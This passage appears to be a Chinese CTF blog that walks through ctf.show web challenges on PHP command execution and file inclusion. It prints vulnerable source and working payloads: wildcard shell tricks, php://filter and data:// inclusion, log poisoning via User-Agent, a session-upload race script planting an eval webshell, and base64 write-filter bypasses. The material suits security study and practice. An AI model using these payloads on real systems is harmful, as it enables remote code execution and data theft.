最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input/output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;A</code>会返回<code>1</code></p></blockquote><p><code>4</code>可以通过<code>$&#123;RANDOM&#125;</code>来构造，故可以得到<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure><p>编写脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(base64.b64encode(&#x27;&lt;?php&#x27;.encode()))</span></span><br><span class="line">url = <span class="string">&#x27;http://ba6d9714-de63-45f5-9fa8-dcf064bad709.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>:<span class="string">&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">response = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;PD9waHA&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造出<code>getallheaders</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;system&#x27;</span>, <span class="number">36</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;getallheaders&#x27;</span>, <span class="number">30</span>, <span class="number">10</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br><span class="line"></span><br><span class="line">header:</span><br><span class="line">1=tac flag.php</span><br></pre></td></tr></table></figure><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php伪协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用data协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>也可以利用php大小写绕过</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=Php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>cfa720bd-94a9-49c3-a122-6a2829e75f7f.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://cfa720bd-94a9-49c3-a122-6a2829e75f7f.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://cfa720bd-94a9-49c3-a122-6a2829e75f7f.challenge.ctf.show/?file=Php://input</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方法一-大小写绕过"><a href="#方法一-大小写绕过" class="headerlink" title="方法一 大小写绕过"></a>方法一 大小写绕过</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=Php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>2ee07c4d-509b-44c0-a5cc-24b98c68c3fc.challenge.ctf.show</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://2ee07c4d-509b-44c0-a5cc-24b98c68c3fc.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl0g.php&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="方法二-包含日志文件"><a href="#方法二-包含日志文件" class="headerlink" title="方法二 包含日志文件"></a>方法二 包含日志文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">/?file=/var/log/nginx/access.log</span><br><span class="line">User-Agent:&lt;?php system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多禁用了<code>:</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"># fl0g.php index.php</span><br><span class="line"></span><br><span class="line">/?file=/var/log/nginx/access.log</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>竞争，参考<a href="https://blog.csdn.net/miuzzx/article/details/116205407?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167163920016800184196214%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167163920016800184196214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-116205407-null-null.article_score_rank_blog&utm_term=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&spm=1018.2226.3001.4450">yu22x</a>师傅脚本即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">session=requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">sess=<span class="string">&#x27;evo1&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://17b55daa-9b61-4a00-8424-5a0fe3c2c471.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&#x27;http://17b55daa-9b61-4a00-8424-5a0fe3c2c471.challenge.ctf.show/?file=/tmp/sess_&#x27;</span> + sess</span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;abc&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line">def <span class="title function_ invoke__">write</span>():</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        r = session.<span class="title function_ invoke__">post</span>(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line">def <span class="title function_ invoke__">read</span>():</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        r = session.<span class="title function_ invoke__">post</span>(url2,data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> in r.text:</span><br><span class="line">            <span class="keyword">print</span>(r.text)</span><br><span class="line">threads = [threading.<span class="title function_ invoke__">Thread</span>(target=write),</span><br><span class="line">       threading.<span class="title function_ invoke__">Thread</span>(target=read)]</span><br><span class="line"><span class="keyword">for</span> t in threads:</span><br><span class="line">    t.<span class="title function_ invoke__">start</span>()</span><br></pre></td></tr></table></figure><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用base64的方式写入文件再进行decode。base64编码只包含64个可打印字符，而php解码base64时遇到不在其中的字符，会忽略掉，将合法字符进行组合变成一个字符串进行解码，所以<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>对其解码后，只有<code>phpdie</code>六个字符组成字符串进行解码(补2个<code>a</code>凑齐8字节)。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0307586d-c3c7-43a3-b6a3-d7c3ff5ed904.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://0307586d-c3c7-43a3-b6a3-d7c3ff5ed904.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">content</span><span class="operator">=</span>aaPD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs/Pg<span class="operator">=</span><span class="operator">=</span></span></span><br></pre></td></tr></table></figure><p>然后访问<code>1.php</code>即可</p><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>data</code>协议的<code>base64</code>编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br></pre></td></tr></table></figure><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>直接包含文件</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?file=/var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e0f908bb-f5ab-4fb9-b93b-0b4ee4b943e6.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span 